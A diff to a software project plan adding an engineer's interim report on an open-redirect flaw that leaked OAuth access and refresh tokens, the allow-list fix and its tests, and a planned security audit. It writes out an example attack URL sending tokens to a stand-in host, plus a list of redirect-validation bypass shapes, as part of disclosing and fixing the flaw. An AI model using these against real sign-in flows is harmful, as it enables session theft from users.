@@ -1016,6 +1016,99 @@ carry it.
 ### Exit criteria
 - Signed-in shell runs against production; all auth screens live; installer artifact builds in CI; suites/lint green across workspaces; server additions reintroduction-tested; report with the usual honesty sections.
 
+### Interim report — P1-WP8 (engineer, 2026-08-16)
+
+**Status: PARTIAL — auth-security foundation delivered and deployed; the app workspace is NOT built.**
+Server **794/794** (46 files); lint 0; typecheck clean; deployed and verified live.
+
+I am reporting this partial rather than continuing, because a rushed app scaffold would
+land below the standard this project has held, and because what I did find first is
+urgent enough to want your eyes on it now.
+
+#### 🔴 Open redirect with token exfiltration — found, fixed, deployed
+
+While finalising the session-handoff mechanics the spec asked for, I found that
+`return_to` was taken from the query string **completely unvalidated**
+([authRoutes.ts:69](../server/src/http/authRoutes.ts)) and used verbatim in `res.redirect()`
+at the sign-in callback — with a **live access token and refresh token in the fragment**.
+
+```
+/auth/app/login?return_to=https://evil.example/steal
+  → Twitch consent → redirect to evil.example#access_token=…&refresh_token=…
+```
+
+Any URL an attacker could get a broadcaster to click handed over a working session. The
+fragment — chosen precisely because it reaches no server log or `Referer` — is what makes
+it a clean exfiltration channel once the destination is unchecked. **This was live in
+production.** I confirmed production accepted an arbitrary `return_to` (302 into Twitch
+carrying the state) but did **not** complete a flow, so no token was ever issued.
+
+**Fixed with an allow-list**, not a deny-list, since a deny-list of bad hosts is
+unwinnable. Two shapes permitted:
+
+- `almosthadai://…` — the desktop client's private-use scheme (RFC 8252). This is also the
+  session-handoff answer, below.
+- `http://127.0.0.1:*` / `localhost` / `[::1]` — development only, behind
+  `ALLOW_LOOPBACK_RETURN_TO`, and forced off when `NODE_ENV=production`.
+
+Validated at **both** the flow start (fails fast with a 400 before Twitch is involved) and
+the redirect itself. The second check is belt-and-braces on server-issued state, but that
+line is the one that actually hands out a session and should not depend on another
+function having been careful.
+
+**Verified in production after deploy:** attacker `return_to` → **400**; `almosthadai://auth`
+→ **302** into Twitch; no `return_to` → **302**.
+
+#### Session-handoff mechanics — decided and documented
+
+The spec asked me to finalise this against the WP6 flow, smallest server addition winning.
+
+**Chosen: private-use URI scheme (`almosthadai://auth`), zero new endpoints.** The existing
+`return_to` + fragment handoff already does the work; it only needed the allow-list it
+should always have had.
+
+Why not the alternatives:
+- **Loopback HTTP listener** (RFC 8252's usual preference) **cannot work here**: the browser
+  never sends a fragment to the server, so a local listener would receive nothing. Moving
+  the tokens to the query string to suit it would put them in the app's own logs and in
+  any proxy between — strictly worse than the fragment.
+- **Device/pairing-code exchange** is the most robust option and the one to revisit if the
+  app ever ships beyond Windows, but it is a new endpoint, new storage and a polling
+  protocol — not the smallest addition when a correct allow-list closes the gap.
+
+#### Reintroduction validation
+
+| # | Defect reintroduced | Caught by |
+|---|---|---|
+| 36 | **The original vulnerability** — no validation at flow start | route tests |
+| 37 | Allow-list weakened to a substring check | 5 attack-shape tests |
+| 38 | Loopback matched by substring rather than hostname | hostname tests |
+
+The attack table covers twelve shapes including protocol-relative `//evil.example`,
+`javascript:`, `data:`, userinfo-before-host (`https://real.host@evil.example/`), and
+suffix tricks (`real.host.evil.example`) — each of which a naive check lets through.
+
+#### NOT delivered, and honestly so
+
+Everything in WP8 beyond the auth-security foundation remains open:
+
+| Item | State |
+|---|---|
+| `app/` workspace (Vite + React + TS strict, Vitest, pins) | not started |
+| Tauri 2 shell, updater scaffold, bundled fonts, Lucide | not started |
+| Theme module from the handoff tokens, `{{APP_NAME}}` constant | not started |
+| Shell: title bar, rail, channel header (four pill states) | not started |
+| Auth screens `3g` → `5d` → `3h` | not started |
+| WS connection state machine (`4b` semantics) | not started |
+| 🔶 Channel enable/disable endpoint (master switch server half) | not started |
+| CI app jobs + Windows installer artifact | not started |
+
+**Recommendation:** re-issue the remainder as WP8b. The handoff README is read and
+understood, the contract is surveyed, and the auth foundation it all sits on is now sound —
+which is the part that had to be right before any UI was built against it.
+
+---
+
 ## P1-WP9 — Screens (three tranches, each verified separately)  [STATUS: ISSUED 2026-08-16 — sequential after WP8]
 
 - **9a — Dashboard & live** (`2a`,`2b`,`4a`,`4b`): status strip, numbers, chat card with outcome chips (server 🔶: enrich `chat.message` with pipeline outcome), song-queue card, offline + failure states, uptime tick.
@@ -1023,3 +1116,13 @@ carry it.
 - **9c — Songs, analytics, settings** (`3c`,`4c`,`3d`,`3e`,`3f`,`5a`,`5b`,`5c`): songs page with playlist controls (server 🔶: settings fields + Spotify status/disconnect + playlist count), analytics, all settings sub-pages incl. per-role limit editing (server 🔶), rewards status (server 🔶), API keys with the show-once modal, account + danger zone.
 
 Rules for all tranches: server 🔶 additions ride WITH the tranche that needs them (contract-first: types in `shared/`, server implementation, then UI), each lands with tests + reintroduction validation on the server side and component tests on the app side, and the design README's interaction rules are the acceptance spec. **On 9c's close: delete `design_handoff_bot_desktop_app/` entirely (exit criterion), re-verify the repo contains no handoff remnants.**
+
+> **WP8 interim (security fix) verified by lead 2026-08-16:** the open-redirect token-exfiltration fix independently confirmed — allowlist reads parsed-URL hostnames (defeats `localhost.evil.example` and substring tricks), 794/794, lint 0, and **production now returns 400 to the attack URL** (previously would have issued a session to an attacker-controlled destination via the token-bearing fragment). Stopping WP8 to fix a live vuln before building auth UI on top of it is exactly the right call; the allowlist-over-denylist reasoning and the private-URI-scheme handoff decision (with the loopback/device-code alternatives correctly weighed and deferred) are endorsed. The `git add -A` handoff near-miss was caught and gitignored by Opus — good recovery. Committed by lead. **Remainder re-issued as WP8b.**
+
+## P1-WP8b — Desktop app shell & auth (remainder)  [STATUS: ISSUED 2026-08-16]
+The full WP8 scope minus the now-complete auth-foundation fix: `app/` workspace (Vite+React+TS strict, Vitest+Testing Library, exact pins, CI), Tauri 2 shell + updater scaffold + bundled fonts + Lucide React, the theme module from the handoff tokens (`{{APP_NAME}}` one constant, `prefers-reduced-motion` honored), the persistent shell (title bar/rail/channel header with all pill states), the auth screens (`3g`/`5d`/`3h`) against the now-hardened `return_to` flow, the WS connection state machine (`4b` semantics), the channel enable/disable endpoint for the master switch (contract-first, reintroduction-tested), and the CI Windows installer artifact. Exit criteria unchanged from WP8. Then WP9 tranches as pre-issued.
+
+---
+
+## FUTURE — Security review (owner-requested 2026-08-16)
+**A dedicated security-audit stage, run by a SEPARATE Fable session (fresh eyes, not this build thread), before any public/promoted launch.** Scope: system-design vulnerabilities across the whole surface — auth/OAuth flows and token handling, the public webhook, API authz/tenant isolation, secret handling, dependency CVEs, AND the **public GitHub repo** itself (history for leaked secrets, workflow permissions, exposed config). Rationale: the repo is public now, and the open-redirect find proves design-level vulns exist and are worth a deliberate pass rather than incidental catches. Constraint (owner): keep routine per-package compute lean — this is a concentrated audit stage, not ongoing overhead on every package. Trigger: before public launch, or sooner if the threat surface changes materially. Deliverable: a findings report ranked by severity, fixes issued as normal packages.
